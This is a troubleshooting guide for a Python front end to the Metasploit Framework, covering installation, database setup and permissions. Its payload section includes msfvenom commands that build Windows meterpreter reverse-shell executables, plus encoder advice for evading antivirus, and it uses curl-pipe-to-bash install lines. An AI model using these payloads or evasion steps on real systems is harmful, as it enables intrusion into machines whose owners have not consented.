# 🔧 Troubleshooting Guide

## Table of Contents

1. [Common Issues](#common-issues)
2. [Installation Problems](#installation-problems)
3. [System Requirements](#system-requirements)
4. [Metasploit Issues](#metasploit-issues)
5. [Database Problems](#database-problems)
6. [File Analysis Issues](#file-analysis-issues)
7. [Payload Generation Problems](#payload-generation-problems)
8. [Network Issues](#network-issues)
9. [Permission Problems](#permission-problems)
10. [Performance Issues](#performance-issues)
11. [Debug Mode](#debug-mode)
12. [Log Files](#log-files)
13. [Support Resources](#support-resources)

## Common Issues

### 1. Application Won't Start

#### Problem: `python3: command not found`
**Solution**: Install Python 3.8 or higher
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt update
sudo apt install python3 python3-pip

# On Arch Linux
sudo pacman -S python python-pip

# Verify installation
python3 --version
```

#### Problem: `Permission denied` when running main.py
**Solution**: Run with sudo privileges
```bash
sudo python3 main.py
```

#### Problem: `ModuleNotFoundError`
**Solution**: Install required dependencies
```bash
pip3 install -r requirements.txt
```

#### Problem: `ImportError: No module named 'modules'`
**Solution**: Run from the correct directory
```bash
cd /path/to/metasploit-manager
python3 main.py
```

### 2. Menu Navigation Issues

#### Problem: Menu options not responding
**Solution**: 
1. Check if you're in the correct directory
2. Ensure all modules are properly installed
3. Try restarting the application

#### Problem: Invalid choice errors
**Solution**: 
1. Enter only valid numbers (1-7)
2. Don't include spaces or special characters
3. Press Enter after entering your choice

#### Problem: Application crashes on menu selection
**Solution**: 
1. Check system logs for errors
2. Verify all dependencies are installed
3. Try running in debug mode

### 3. Display Issues

#### Problem: Colors not displaying correctly
**Solution**: 
1. Check if your terminal supports ANSI colors
2. Try using a different terminal emulator
3. Set environment variable: `export TERM=xterm-256color`

#### Problem: ASCII art not displaying properly
**Solution**: 
1. Use a terminal with Unicode support
2. Set proper locale: `export LANG=en_US.UTF-8`
3. Use a modern terminal emulator

#### Problem: Text appears garbled
**Solution**: 
1. Check terminal encoding settings
2. Set UTF-8 encoding: `export LC_ALL=en_US.UTF-8`
3. Restart terminal and application

## Installation Problems

### 1. Python Installation

#### Problem: Python version too old
**Solution**: Install Python 3.8 or higher
```bash
# Check current version
python3 --version

# Install newer version if needed
sudo apt install python3.8 python3.8-pip
```

#### Problem: pip not found
**Solution**: Install pip
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install python3-pip

# On Arch Linux
sudo pacman -S python-pip

# Verify installation
pip3 --version
```

#### Problem: Virtual environment issues
**Solution**: Create and activate virtual environment
```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 2. System Dependencies

#### Problem: `msfvenom: command not found`
**Solution**: Install Metasploit Framework
```bash
# On Parrot OS
sudo apt install metasploit-framework

# On Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash

# Verify installation
msfvenom --help
```

#### Problem: `file: command not found`
**Solution**: Install file command
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install file

# On Arch Linux
sudo pacman -S file
```

#### Problem: `strings: command not found`
**Solution**: Install binutils
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install binutils

# On Arch Linux
sudo pacman -S binutils
```

#### Problem: `objdump: command not found`
**Solution**: Install binutils (includes objdump)
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install binutils

# On Arch Linux
sudo pacman -S binutils
```

#### Problem: `readelf: command not found`
**Solution**: Install binutils (includes readelf)
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install binutils

# On Arch Linux
sudo pacman -S binutils
```

#### Problem: `unzip: command not found`
**Solution**: Install unzip
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install unzip

# On Arch Linux
sudo pacman -S unzip
```

## System Requirements

### 1. Operating System

#### Supported Systems
- **Parrot OS**: Fully tested and supported
- **Ubuntu**: 18.04+ supported
- **Debian**: 9+ supported
- **Kali Linux**: Supported
- **Arch Linux**: Supported

#### Unsupported Systems
- **Windows**: Not supported
- **macOS**: Not supported
- **Other Linux distributions**: May work but not tested

### 2. Hardware Requirements

#### Minimum Requirements
- **RAM**: 2GB minimum, 4GB recommended
- **Storage**: 1GB free space
- **CPU**: Any x86_64 processor
- **Network**: Internet connection for updates

#### Recommended Requirements
- **RAM**: 8GB or more
- **Storage**: 5GB free space
- **CPU**: Multi-core processor
- **Network**: Stable internet connection

### 3. Software Requirements

#### Required Software
- **Python**: 3.8 or higher
- **Metasploit Framework**: Latest version
- **PostgreSQL**: For database operations
- **System Tools**: file, strings, objdump, readelf, unzip

#### Optional Software
- **VirtualBox/VMware**: For isolated testing
- **Docker**: For containerized testing
- **Git**: For version control

## Metasploit Issues

### 1. Metasploit Installation

#### Problem: Metasploit installation fails
**Solution**: 
1. Update system packages
2. Install dependencies
3. Use official installation method

```bash
# Update system
sudo apt update && sudo apt upgrade

# Install dependencies
sudo apt install curl git

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash
```

#### Problem: Metasploit version too old
**Solution**: Update Metasploit Framework
```bash
# Update Metasploit
sudo msfupdate

# Or reinstall
sudo apt remove metasploit-framework
sudo apt install metasploit-framework
```

#### Problem: Metasploit commands not found
**Solution**: Add Metasploit to PATH
```bash
# Add to .bashrc
echo 'export PATH=$PATH:/opt/metasploit-framework/bin' >> ~/.bashrc
source ~/.bashrc
```

### 2. Metasploit Configuration

#### Problem: Database connection failed
**Solution**: Initialize Metasploit database
```bash
# Initialize database
sudo msfdb init

# Start database
sudo msfdb start

# Check status
sudo msfdb status
```

#### Problem: Metasploit services not starting
**Solution**: Start required services
```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Start Metasploit services
sudo msfdb start

# Check service status
sudo systemctl status postgresql
```

#### Problem: Permission denied for Metasploit
**Solution**: Fix permissions
```bash
# Fix Metasploit permissions
sudo chown -R $(whoami):$(whoami) ~/.msf4

# Fix database permissions
sudo chown -R postgres:postgres /var/lib/postgresql
```

## Database Problems

### 1. PostgreSQL Issues

#### Problem: PostgreSQL not installed
**Solution**: Install PostgreSQL
```bash
# On Parrot OS / Debian / Ubuntu
sudo apt install postgresql postgresql-contrib

# On Arch Linux
sudo pacman -S postgresql
```

#### Problem: PostgreSQL not starting
**Solution**: Start PostgreSQL service
```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Enable auto-start
sudo systemctl enable postgresql

# Check status
sudo systemctl status postgresql
```

#### Problem: Database connection refused
**Solution**: Check PostgreSQL configuration
```bash
# Check PostgreSQL status
sudo systemctl status postgresql

# Check listening ports
sudo netstat -tlnp | grep postgres

# Check PostgreSQL logs
sudo tail -f /var/log/postgresql/postgresql-*.log
```

### 2. Metasploit Database

#### Problem: Database initialization fails
**Solution**: Reset and reinitialize database
```bash
# Stop Metasploit services
sudo msfdb stop

# Reset database
sudo msfdb delete

# Reinitialize database
sudo msfdb init

# Start services
sudo msfdb start
```

#### Problem: Database corruption
**Solution**: Recreate database
```bash
# Backup existing data (if needed)
sudo msfdb backup

# Delete corrupted database
sudo msfdb delete

# Create new database
sudo msfdb init

# Restore data (if needed)
sudo msfdb restore
```

#### Problem: Database access denied
**Solution**: Fix database permissions
```bash
# Switch to postgres user
sudo -u postgres psql

# Create Metasploit user
CREATE USER msf WITH PASSWORD 'msf';
CREATE DATABASE msf OWNER msf;
GRANT ALL PRIVILEGES ON DATABASE msf TO msf;
\q
```

## File Analysis Issues

### 1. File Access Problems

#### Problem: File not found in checkfiles directory
**Solution**: 
1. Ensure file exists in `checkfiles/` directory
2. Check file permissions
3. Verify file path

```bash
# Check if file exists
ls -la checkfiles/

# Check file permissions
chmod 644 checkfiles/your_file

# Verify file path
pwd
```

#### Problem: Permission denied when reading files
**Solution**: Fix file permissions
```bash
# Make file readable
chmod 644 checkfiles/your_file

# Or make readable by all
chmod 644 checkfiles/your_file
```

#### Problem: File analysis fails
**Solution**: 
1. Check file format
2. Verify file integrity
3. Check system tools

```bash
# Check file type
file checkfiles/your_file

# Check file integrity
md5sum checkfiles/your_file

# Test system tools
strings --help
objdump --help
```

### 2. Analysis Tool Issues

#### Problem: Analysis tools not working
**Solution**: Install and configure analysis tools
```bash
# Install required tools
sudo apt install file binutils

# Test tools
file --version
strings --version
objdump --version
readelf --version
```

#### Problem: Analysis results incorrect
**Solution**: 
1. Check file format
2. Verify analysis parameters
3. Test with known files

#### Problem: Analysis takes too long
**Solution**: 
1. Check file size
2. Optimize analysis parameters
3. Use smaller test files

## Payload Generation Problems

### 1. Payload Creation Issues

#### Problem: Payload generation fails
**Solution**: 
1. Check Metasploit installation
2. Verify parameters
3. Check output directory

```bash
# Test msfvenom
msfvenom --list payloads

# Check output directory
ls -la payloads/

# Create output directory if needed
mkdir -p payloads/
```

#### Problem: Invalid payload parameters
**Solution**: 
1. Check parameter format
2. Verify IP addresses
3. Check port numbers

```bash
# Test parameter format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 --help
```

#### Problem: Payload file not created
**Solution**: 
1. Check output directory permissions
2. Verify filename
3. Check disk space

```bash
# Check disk space
df -h

# Check directory permissions
ls -la payloads/

# Fix permissions if needed
chmod 755 payloads/
```

### 2. Payload Testing Issues

#### Problem: Payload doesn't execute
**Solution**: 
1. Check file permissions
2. Verify architecture compatibility
3. Test in isolated environment

```bash
# Make payload executable
chmod +x payloads/your_payload

# Check file type
file payloads/your_payload

# Test in VM
```

#### Problem: Payload detected by antivirus
**Solution**: 
1. Use encoding/obfuscation
2. Test in isolated environment
3. Use different payload types

```bash
# Use encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

## Network Issues

### 1. Connection Problems

#### Problem: Cannot connect to target
**Solution**: 
1. Check network connectivity
2. Verify IP addresses
3. Check firewall rules

```bash
# Test connectivity
ping 192.168.1.100

# Check port availability
nmap -p 4444 192.168.1.100

# Check firewall
sudo ufw status
```

#### Problem: Port already in use
**Solution**: 
1. Find process using port
2. Kill process or use different port
3. Check port availability

```bash
# Find process using port
sudo netstat -tlnp | grep 4444

# Kill process
sudo kill -9 PID

# Use different port
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -f exe -o payload.exe
```

#### Problem: Firewall blocking connections
**Solution**: 
1. Check firewall rules
2. Allow required ports
3. Test connectivity

```bash
# Check firewall status
sudo ufw status

# Allow port
sudo ufw allow 4444

# Test connection
telnet 192.168.1.100 4444
```

### 2. Network Configuration

#### Problem: Wrong IP address
**Solution**: 
1. Check network configuration
2. Verify IP addresses
3. Update configuration

```bash
# Check IP configuration
ip addr show

# Check routing
ip route show

# Test connectivity
ping 192.168.1.100
```

#### Problem: Network interface issues
**Solution**: 
1. Check network interfaces
2. Restart network service
3. Check network configuration

```bash
# Check interfaces
ip link show

# Restart network
sudo systemctl restart networking

# Check configuration
cat /etc/network/interfaces
```

## Permission Problems

### 1. File Permissions

#### Problem: Cannot read files
**Solution**: Fix file permissions
```bash
# Make file readable
chmod 644 checkfiles/your_file

# Make directory readable
chmod 755 checkfiles/
```

#### Problem: Cannot write files
**Solution**: Fix directory permissions
```bash
# Make directory writable
chmod 755 payloads/

# Make file writable
chmod 644 payloads/your_file
```

#### Problem: Cannot execute files
**Solution**: Make files executable
```bash
# Make file executable
chmod +x payloads/your_payload

# Make directory executable
chmod 755 payloads/
```

### 2. System Permissions

#### Problem: Cannot access system tools
**Solution**: 
1. Check PATH environment variable
2. Use full paths to tools
3. Fix tool permissions

```bash
# Check PATH
echo $PATH

# Use full path
/usr/bin/msfvenom --help

# Fix permissions
sudo chmod +x /usr/bin/msfvenom
```

#### Problem: Cannot access database
**Solution**: 
1. Check database permissions
2. Fix user permissions
3. Restart database service

```bash
# Check database permissions
sudo -u postgres psql -c "\du"

# Fix user permissions
sudo -u postgres createuser -s $(whoami)

# Restart database
sudo systemctl restart postgresql
```

## Performance Issues

### 1. Slow Performance

#### Problem: Application runs slowly
**Solution**: 
1. Check system resources
2. Close unnecessary applications
3. Optimize system settings

```bash
# Check system resources
top
htop
free -h
df -h
```

#### Problem: File analysis takes too long
**Solution**: 
1. Use smaller files for testing
2. Optimize analysis parameters
3. Check system performance

#### Problem: Memory usage high
**Solution**: 
1. Check memory usage
2. Close unnecessary applications
3. Restart application

```bash
# Check memory usage
free -h

# Check processes
ps aux --sort=-%mem | head
```

### 2. System Optimization

#### Problem: System running slowly
**Solution**: 
1. Check system load
2. Optimize system settings
3. Update system

```bash
# Check system load
uptime
w

# Update system
sudo apt update && sudo apt upgrade
```

#### Problem: Disk space low
**Solution**: 
1. Check disk usage
2. Clean up unnecessary files
3. Free up space

```bash
# Check disk usage
df -h

# Find large files
find / -type f -size +100M 2>/dev/null

# Clean package cache
sudo apt clean
```

## Debug Mode

### 1. Enabling Debug Mode

#### Enable Debug Mode
```bash
# Set debug environment variable
export DEBUG=1

# Run application
python3 main.py
```

#### Debug Output
Debug mode provides detailed information about:
- Module loading
- Function execution
- Error details
- System information

### 2. Debug Information

#### System Information
```bash
# Check system information
uname -a
lsb_release -a
python3 --version
```

#### Environment Information
```bash
# Check environment variables
env | grep -E "(PATH|PYTHON|DEBUG)"

# Check Python path
python3 -c "import sys; print(sys.path)"
```

#### Module Information
```bash
# Check module imports
python3 -c "import modules; print(dir(modules))"

# Check specific module
python3 -c "from modules.file_analysis import FileAnalyzer; print(FileAnalyzer.__doc__)"
```

## Log Files

### 1. System Logs

#### System Logs Location
```bash
# System logs
/var/log/syslog
/var/log/messages
/var/log/kern.log

# Application logs
/var/log/metasploit/
~/.msf4/logs/
```

#### Viewing Logs
```bash
# View system logs
sudo tail -f /var/log/syslog

# View Metasploit logs
tail -f ~/.msf4/logs/framework.log

# View PostgreSQL logs
sudo tail -f /var/log/postgresql/postgresql-*.log
```

### 2. Application Logs

#### Enable Logging
```bash
# Set log level
export LOG_LEVEL=DEBUG

# Run with logging
python3 main.py 2>&1 | tee application.log
```

#### Log Analysis
```bash
# Search for errors
grep -i error application.log

# Search for warnings
grep -i warning application.log

# Search for specific module
grep -i "file_analysis" application.log
```

## Support Resources



### 1. Getting Help

#### Before Asking for Help
1. **Check Documentation**: Read the documentation first
2. **Search Issues**: Search existing GitHub issues
3. **Check Logs**: Check system and application logs
4. **Try Debug Mode**: Run in debug mode for more information

#### When Asking for Help
1. **Provide Details**: Include system information, error messages, and steps to reproduce
2. **Include Logs**: Include relevant log files
3. **Be Specific**: Describe the exact problem and expected behavior
4. **Use Proper Channels**: Use appropriate support channels

#### Contact Information
- **Email**: latifimods@gmail.com
- **Discord**: https://discord.gg/KcuMUUAP5T
- **GitHub**: https://github.com/MetaMops/MetaDox/issues
- **Website**: https://www.iddox.tech/

### 2. Contributing

#### Reporting Issues
1. **Check Existing Issues**: Search for similar issues
2. **Create New Issue**: Create a new issue with detailed information
3. **Provide Information**: Include system details, error messages, and steps to reproduce
4. **Follow Guidelines**: Follow the issue template and guidelines

#### Contributing Code
1. **Fork Repository**: Fork the repository
2. **Create Branch**: Create a feature branch
3. **Make Changes**: Make your changes
4. **Test Changes**: Test your changes thoroughly
5. **Submit Pull Request**: Submit a pull request

#### Documentation
1. **Improve Documentation**: Help improve documentation
2. **Report Issues**: Report documentation issues
3. **Suggest Improvements**: Suggest documentation improvements
4. **Contribute Examples**: Contribute examples and tutorials

---

**Remember: When in doubt, check the documentation first and don't hesitate to ask for help!** 🛡️
